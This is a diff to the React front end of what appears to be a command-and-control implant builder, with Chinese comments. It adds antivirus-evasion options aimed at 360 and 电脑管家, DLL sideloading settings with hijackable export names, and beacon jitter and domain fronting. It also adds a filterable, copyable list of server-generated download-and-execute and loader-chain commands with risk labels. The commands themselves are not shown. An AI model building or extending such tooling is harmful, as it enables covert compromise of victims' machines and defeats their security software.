@@ -1,8 +1,9 @@
 import { useState, useEffect, useCallback } from 'react'
-import { Plus, Download, RefreshCw, Settings, FileCode, Cpu, Server, Loader2, Trash2, Shield, Copy, CheckCircle2, Monitor, HardDrive, Terminal, AlertTriangle } from 'lucide-react'
+import { Plus, Download, RefreshCw, FileCode, Cpu, Server, Loader2, Trash2, Shield, Copy, CheckCircle2, Monitor, HardDrive, Terminal, AlertTriangle, Search } from 'lucide-react'
 import { builderApi, sessionApi, BuildRequest, BuilderInfo, type RelayNode, type OneLinerSet } from '../api'
 import { useToast, ToastContainer } from '../components/Toast'
 import { DownloadProgress } from '../components/DownloadProgress'
+import { Badge, Callout, Section, RiskBadge } from '../components/ui'
 import axios from 'axios'
 import './Builds.css'
 
@@ -29,7 +30,7 @@ export function Builds() {
   // 构建结果：一键上线命令由服务端生成（含下载地址解析 + 多条免杀变体），
   // 前端不再用 window.location.origin 自己拼地址（从 localhost 打开后台时会生成
   // 目标机无法访问的 localhost 地址）。
-  const [buildResult, setBuildResult] = useState<{ id: string; name: string; format: string; size: number; serverUrl: string; oneLinerSet?: OneLinerSet; signed?: boolean; signer?: string; signStatus?: string; signMessage?: string } | null>(null)
+  const [buildResult, setBuildResult] = useState<{ id: string; name: string; format: string; size: number; serverUrl: string; oneLinerSet?: OneLinerSet; signed?: boolean; signer?: string; signStatus?: string; signMessage?: string; adviceTitle?: string; adviceTips?: string[] } | null>(null)
 
   // format -> 下载文件扩展名；未知格式原样返回，避免误转
   const formatToExt = (format: string): string => {
@@ -397,6 +398,8 @@ export function Builds() {
         signer: response.data.signer,
         signStatus: response.data.sign_status,
         signMessage: response.data.sign_message,
+        adviceTitle: response.data.loader_advice_title,
+        adviceTips: response.data.loader_advice_tips,
         // 一键上线命令与地址解析结果全部取自服务端响应
         oneLinerSet: response.data.one_liners?.length
           ? {
@@ -578,17 +581,44 @@ export function Builds() {
                 <div className="result-item"><span className="result-label">格式</span><span className="result-value">{buildResult.format}</span></div>
                 <div className="result-item"><span className="result-label">大小</span><span className="result-value">{(buildResult.size / 1024).toFixed(2)} KB</span></div>
                 <div className="result-item server-url"><span className="result-label">服务器地址</span><span className="result-value">{buildResult.serverUrl}</span></div>
-                {buildResult.signMessage !== undefined && (
-                  <div className="result-item">
-                    <span className="result-label">代码签名</span>
-                    <span className="result-value" style={{ color: buildResult.signed ? 'var(--color-success)' : 'var(--color-warning, #f0a020)' }}>
-                      {buildResult.signed
-                        ? `已签名（${buildResult.signer || '签名者未知'}）`
-                        : `未签名：${buildResult.signMessage || buildResult.signStatus || '未配置'}`}
-                    </span>
-                  </div>
-                )}
+                <div className="result-item">
+                  <span className="result-label">代码签名</span>
+                  <span className="result-value">
+                    {buildResult.signed ? (
+                      <Badge tone="ok">
+                        <CheckCircle2 size={12} /> 已签名
+                      </Badge>
+                    ) : (
+                      <Badge tone="warn">未签名</Badge>
+                    )}
+                  </span>
+                </div>
               </div>
+
+              {/* 签名详情 / 未签名原因：用 Callout 直接说清"能不能在装 360 的机器上跑" */}
+              {buildResult.signMessage !== undefined && (
+                <Callout tone={buildResult.signed ? 'ok' : 'warn'} title={buildResult.signed ? `签名者：${buildResult.signer || '未知'}` : '这个载荷未签名'} style={{ marginBottom: 12 }}>
+                  {buildResult.signMessage}
+                  {!buildResult.signed && (
+                    <div style={{ marginTop: 4 }}>
+                      在装有 360/电脑管家的主机上，未签名的新 PE 会在创建进程阶段被拒绝执行并删除
+                      —— 要么在服务端配好证书（设置 → 植入端与载荷构建）后重新构建，要么改用下面的加载器链。
+                    </div>
+                  )}
+                </Callout>
+              )}
+
+              {/* 落地链建议：按"是否已签名 + 平台/格式"给出降级顺序 */}
+              {buildResult.adviceTitle && (
+                <Callout tone="info" title={`落地建议：${buildResult.adviceTitle}`} style={{ marginBottom: 12 }}>
+                  <ol style={{ margin: '4px 0 0 18px', padding: 0, lineHeight: 1.8 }}>
+                    {(buildResult.adviceTips || []).map((t, i) => (
+                      <li key={i}>{t}</li>
+                    ))}
+                  </ol>
+                </Callout>
+              )}
+
               {buildResult.oneLinerSet?.variants?.length ? (
                 <div className="oneliner-section">
                   <div className="oneliner-section-title">
@@ -927,8 +957,12 @@ export function Builds() {
                 </p>
               </div>
 
-              <div className="form-section">
-                <h4><Settings size={16} /> 高级选项</h4>
+              <Section
+                title="高级选项"
+                desc="回连节奏、重试、工作时间、中继与域前置等。心跳默认跟随服务端配置（60s ± 20%），不建议改成固定短周期。"
+                badge={<Badge>可选</Badge>}
+                defaultOpen={false}
+              >
                 <div className="form-row">
                   <div className="form-group">
                     <label>心跳间隔 (秒)</label>
@@ -998,10 +1032,14 @@ export function Builds() {
                     />
                   </div>
                 </div>
-              </div>
+              </Section>
 
-              <div className="form-section evasion-section">
-                <h4><Shield size={16} /> 免杀选项 🔰</h4>
+              <Section
+                title="免杀与落地选项"
+                desc="决定载荷的静态特征面，以及它能不能在装有 360/电脑管家这类国产杀软的主机上跑起来。默认值按「最小特征、需要时才开」设置，不确定就保持默认。"
+                badge={<Badge tone="accent">对抗面</Badge>}
+                defaultOpen
+              >
 
                 <div className="evasion-toggle-row">
                   <div className="toggle-group">
@@ -1147,44 +1185,81 @@ export function Builds() {
                   </div>
                 </div>
 
-                {formData.format === 'dll' && (
-                  <div className="evasion-toggle-row">
-                    <div className="toggle-group">
-                      <label className="toggle-label"><span>DLL 载荷（白加黑 / rundll32）</span></label>
-                      <p className="form-hint">
-                        {builderInfo?.evasion?.dll_message ||
-                          'DLL 需要与目标架构一致的 mingw-w64 gcc（x64 需 x86_64-w64-mingw32-gcc）'}
-                      </p>
-                      <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginTop: '8px', flexWrap: 'wrap' }}>
-                        <div className="form-group" style={{ margin: 0 }}>
-                          <label>导出函数名</label>
-                          <input
-                            type="text"
-                            name="dll_export"
-                            value={formData.dll_export ?? ''}
-                            onChange={handleInputChange}
-                            placeholder="Start（rundll32 payload.dll,Start）"
-                          />
-                        </div>
-                        <label className="toggle-label" style={{ marginTop: 18 }}>
-                          <input
-                            type="checkbox"
-                            name="dll_autostart"
-                            checked={formData.dll_autostart !== false}
-                            onChange={handleInputChange}
-                          />
-                          <span>DLL 加载即启动</span>
+                {formData.format === 'dll' && (() => {
+                  // DLL 走 c-shared，**必须**有与目标架构一致的 mingw gcc：
+                  // 选 amd64 但本机只有 i686 时，这里就要当场说清 + 给出可点的替代架构，
+                  // 而不是等构建失败（"我明明选了 Go 的 dll 为什么不行"）。
+                  const arch = formData.arch || 'amd64'
+                  const dllArch = builderInfo?.evasion?.dll_arch?.[arch]
+                  const ok = dllArch ? dllArch.available : (builderInfo?.evasion?.dll_available ?? false)
+                  const msg = dllArch?.message || builderInfo?.evasion?.dll_message || ''
+                  const alt386 = builderInfo?.evasion?.dll_arch?.['386']?.available
+                  return (
+                    <div className="evasion-toggle-row">
+                      <div className="toggle-group">
+                        <label className="toggle-label">
+                          <span>DLL 载荷（白加黑 / rundll32）</span>
+                          {ok ? <Badge tone="ok">本机可用</Badge> : <Badge tone="danger">缺 {arch} 版 gcc</Badge>}
                         </label>
+
+                        {ok ? (
+                          <p className="form-hint">{msg}</p>
+                        ) : (
+                          <Callout tone="danger" title={`当前架构 ${arch} 的 DLL 无法构建`} style={{ marginTop: 6 }}>
+                            <div style={{ lineHeight: 1.8 }}>
+                              Go 的 DLL 走 <code>-buildmode=c-shared</code>，**内部仍要调用 C 编译器（cgo）**，
+                              因此必须装<strong>与目标架构一致</strong>的 mingw-w64 gcc（x64 要
+                              <code>x86_64-w64-mingw32-gcc</code>，只有 32 位的 i686 编译器编不出 64 位 DLL）。
+                            </div>
+                            <div style={{ marginTop: 6, fontFamily: 'var(--font-mono)', fontSize: 11 }}>{msg}</div>
+                            <div style={{ marginTop: 8, display: 'flex', gap: 8, flexWrap: 'wrap' }}>
+                              {alt386 && arch !== '386' && (
+                                <button
+                                  type="button"
+                                  className="btn-small"
+                                  onClick={() => setFormData((prev) => ({ ...prev, arch: '386' }))}
+                                >
+                                  改用 386 架构构建（本机已有 i686 gcc）
+                                </button>
+                              )}
+                              <span className="form-hint" style={{ margin: 0 }}>
+                                或在「设置 → 植入端与载荷构建」把 <code>mingw_gcc_path</code> 指向 x64 版 gcc。
+                              </span>
+                            </div>
+                          </Callout>
+                        )}
+
+                        <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginTop: '8px', flexWrap: 'wrap' }}>
+                          <div className="form-group" style={{ margin: 0 }}>
+                            <label>导出函数名</label>
+                            <input
+                              type="text"
+                              name="dll_export"
+                              value={formData.dll_export ?? ''}
+                              onChange={handleInputChange}
+                              placeholder="Start（rundll32 payload.dll,Start）"
+                            />
+                          </div>
+                          <label className="toggle-label" style={{ marginTop: 18 }}>
+                            <input
+                              type="checkbox"
+                              name="dll_autostart"
+                              checked={formData.dll_autostart !== false}
+                              onChange={handleInputChange}
+                            />
+                            <span>DLL 加载即启动</span>
+                          </label>
+                        </div>
+                        <p className="form-hint">
+                          白加黑场景宿主不一定调用我们的导出函数，所以默认<strong>加载即启动</strong>；
+                          需要宿主控制时机时取消勾选。导出名可以填成宿主期望的名字（例如
+                          <code>GetFileVersionInfoW</code>）——服务端用 C 侧 __stdcall 包装导出，
+                          不会和系统声明冲突（386 上也会剥掉 @16 修饰）。
+                        </p>
                       </div>
-                      <p className="form-hint">
-                        白加黑场景宿主不一定调用我们的导出函数，所以默认<strong>加载即启动</strong>；
-                        需要宿主控制时机时取消勾选。导出名可以填成宿主期望的名字（例如
-                        <code>GetFileVersionInfoW</code>）——服务端用 C 侧 __stdcall 包装导出，
-                        不会和系统声明冲突（386 上也会剥掉 @16 修饰）。
-                      </p>
                     </div>
-                  </div>
-                )}
+                  )
+                })()}
 
                 <div className="evasion-toggle-row">
                   <div className="toggle-group">
@@ -1218,7 +1293,7 @@ export function Builds() {
                     </div>
                   </div>
                 </div>
-              </div>
+              </Section>
             </div>
             <div className="modal-footer">
               <button className="btn btn-secondary" onClick={() => setShowModal(false)}>
@@ -1245,6 +1320,9 @@ export function Builds() {
 /**
  * 一键上线命令列表：命令与下载地址均由服务端生成（internal/server/api/oneliner.go），
  * 这里只负责展示多个免杀变体、标注推荐项、以及每条的独立复制按钮。
+ *
+ * v1.3.5 起服务端会同时给出「下载即执行」与「加载器链」两类共 10~14 条，一屏铺开会很长，
+ * 因此这里做了三件事：按类型分组筛选、按关键字搜索、风险等级可见（note 里带"风险等级：高/中/低"）。
  */
 function OneLinerList({
   set,
@@ -1257,6 +1335,9 @@ function OneLinerList({
   copiedCmd: string | null
   onCopy: (cmd: string) => void
 }) {
+  const [query, setQuery] = useState('')
+  const [kind, setKind] = useState<'all' | 'direct' | 'loader'>('all')
+
   if (loading) {
     return (
       <div className="oneliner-loading">
@@ -1269,6 +1350,22 @@ function OneLinerList({
   if (set.error || !set.variants?.length) {
     return <p className="oneliner-hint">{set.error || '暂无可用的上线命令'}</p>
   }
+
+  // 加载器链的判定：服务端给加载器链写了 note（含前置条件/风险等级），普通"下载即执行"没有
+  const isLoader = (n?: string) => !!n && n.length > 0
+  const riskOf = (note?: string): '低' | '中' | '高' | null => {
+    if (!note) return null
+    const m = note.match(/风险等级[：:]\s*(低|中|高)/)
+    return m ? (m[1] as '低' | '中' | '高') : null
+  }
+  const q = query.trim().toLowerCase()
+  const visible = set.variants.filter((v) => {
+    if (kind === 'direct' && isLoader(v.note)) return false
+    if (kind === 'loader' && !isLoader(v.note)) return false
+    if (!q) return true
+    return `${v.name} ${v.desc} ${v.command} ${v.note || ''}`.toLowerCase().includes(q)
+  })
+  const loaderCount = set.variants.filter((v) => isLoader(v.note)).length
 
   return (
     <>
@@ -1285,31 +1382,66 @@ function OneLinerList({
           <span>{set.warning}</span>
         </div>
       )}
+
+      {/* 分组 / 搜索 / 批量复制：条数多的时候先筛再用 */}
+      <div className="oneliner-filters">
+        <div className="oneliner-seg">
+          <button className={kind === 'all' ? 'active' : ''} onClick={() => setKind('all')}>
+            全部 {set.variants.length}
+          </button>
+          <button className={kind === 'direct' ? 'active' : ''} onClick={() => setKind('direct')}>
+            下载即执行 {set.variants.length - loaderCount}
+          </button>
+          <button className={kind === 'loader' ? 'active' : ''} onClick={() => setKind('loader')}>
+            加载器链 {loaderCount}
+          </button>
+        </div>
+        <div className="oneliner-search">
+          <Search size={13} />
+          <input value={query} onChange={(e) => setQuery(e.target.value)} placeholder="搜索命令 / 手法 / 前置条件" />
+        </div>
+        <button
+          className="oneliner-copy-btn"
+          title="复制当前筛选出的全部命令"
+          onClick={() => onCopy(visible.map((v) => v.command).join('\r\n'))}
+          disabled={visible.length === 0}
+        >
+          <Copy size={14} /> 复制全部（{visible.length}）
+        </button>
+      </div>
+
+      {visible.length === 0 && <p className="oneliner-hint">没有匹配的命令，换个关键字或切回「全部」。</p>}
+
       <div className="oneliner-variants">
-        {set.variants.map((v, i) => (
-          <div className="oneliner-box" key={`${v.name}-${i}`}>
-            <div className="oneliner-header">
-              <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontWeight: 600, flexWrap: 'wrap' }}>
-                <Terminal size={14} /> {v.name}
-                {i === 0 && <span className="oneliner-tag oneliner-tag-primary">推荐</span>}
-                <span className="oneliner-tag">{v.shell}</span>
-              </span>
-              <button className="oneliner-copy-btn" onClick={() => onCopy(v.command)} title="复制该命令">
-                {copiedCmd === v.command ? <CheckCircle2 size={14} /> : <Copy size={14} />}
-                {copiedCmd === v.command ? '已复制' : '复制'}
-              </button>
+        {visible.map((v) => {
+          const level = riskOf(v.note)
+          const loader = isLoader(v.note)
+          return (
+            <div className="oneliner-box" key={v.name}>
+              <div className="oneliner-header">
+                <span style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontWeight: 600, flexWrap: 'wrap' }}>
+                  <Terminal size={14} /> {v.name}
+                  {loader ? <Badge tone="accent">加载器链</Badge> : <Badge>直连</Badge>}
+                  {level && <RiskBadge level={level} />}
+                  <span className="oneliner-tag">{v.shell}</span>
+                </span>
+                <button className="oneliner-copy-btn" onClick={() => onCopy(v.command)} title="复制该命令">
+                  {copiedCmd === v.command ? <CheckCircle2 size={14} /> : <Copy size={14} />}
+                  {copiedCmd === v.command ? '已复制' : '复制'}
+                </button>
+              </div>
+              <code className="oneliner-code">{v.command}</code>
+              {v.desc && <p className="oneliner-hint">{v.desc}</p>}
+              {/* 加载器链的前置条件与风险提示（服务端 note 字段，普通变体为空） */}
+              {v.note && (
+                <p className="oneliner-hint oneliner-note">
+                  <AlertTriangle size={12} style={{ verticalAlign: '-2px', marginRight: 4 }} />
+                  {v.note}
+                </p>
+              )}
             </div>
-            <code className="oneliner-code">{v.command}</code>
-            {v.desc && <p className="oneliner-hint">{v.desc}</p>}
-            {/* 加载器链的前置条件与风险提示（服务端 note 字段，普通变体为空） */}
-            {v.note && (
-              <p className="oneliner-hint" style={{ color: 'var(--color-warning, #f0a020)' }}>
-                <AlertTriangle size={12} style={{ verticalAlign: '-2px', marginRight: 4 }} />
-                {v.note}
-              </p>
-            )}
-          </div>
-        ))}
+          )
+        })}
       </div>
     </>
   )
